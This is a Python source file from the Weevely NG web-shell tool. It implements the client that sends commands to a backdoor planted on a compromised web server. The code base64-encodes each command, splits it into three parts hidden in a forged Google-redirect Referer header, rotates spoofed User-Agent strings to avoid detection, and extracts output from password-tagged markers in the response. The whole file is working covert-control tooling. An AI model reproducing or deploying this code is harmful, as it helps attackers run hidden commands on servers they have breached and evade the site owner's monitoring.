# This file is part of Weevely NG.
#
# Copyright(c) 2011-2012 Weevely Developers
# http://code.google.com/p/weevely/
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
import random, urllib2, urlparse, re, base64
from request import Request
from urllib import urlencode

class CmdRequest(Request):
	agents = ( 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6', \
			   'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.14) Gecko/2009090216 Ubuntu/9.04 (jaunty) Firefox/3.0.14', \
			   'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; GTB5; InfoPath.1)' )

	def __init__( self, url, password, proxy = None ):
		Request.__init__( self, url, proxy)
			
		self.password  = password
		self.extractor = re.compile( "<%s>(.*)</%s>" % ( self.password[2:], self.password[2:] ), re.DOTALL )
		self.parsed	   = urlparse.urlparse(self.url)
		self.data = None

		if not self.parsed.path:
			self.query = self.parsed.netloc.replace( '/', ' ' )
		else:
			self.query = ''.join( self.parsed.path.split('.')[:-1] ).replace( '/', ' ' )

		self.opener.addheader( 'User-Agent', self.agents[ random.randint( 0, len(self.agents) - 1 ) ] )

	def setPayload( self, payload ):
		payload = base64.b64encode( payload.strip() )
		length  = len(payload)
		third	= length / 3
		thirds  = third * 2
		referer = "http://www.google.com/url?sa=%s&source=web&ct=7&url=%s&rct=j&q=%s&ei=%s&usg=%s&sig2=%s" % ( self.password[:2], \
                                                                                                               urllib2.quote( self.url ), \
                                                                                                               self.query.strip(), \
                                                                                                               payload[:third], \
                                                                                                               payload[third:thirds], \
                                                                                                               payload[thirds:] )
		self['Referer']	= referer

	def setPostData(self, data_dict):
		self.data = urlencode(data_dict)

	def execute( self ):
		response = self.read()
		data	 = self.extractor.findall(response)
		if len(data) < 1 or not data:
			raise NoDataException( 'No data returned.' )
		else:
			return data[0].strip()
		
class NoDataException(Exception):
	def __init__(self, value):
		self.error = value
	def __str__(self):
   		return repr(self.error)

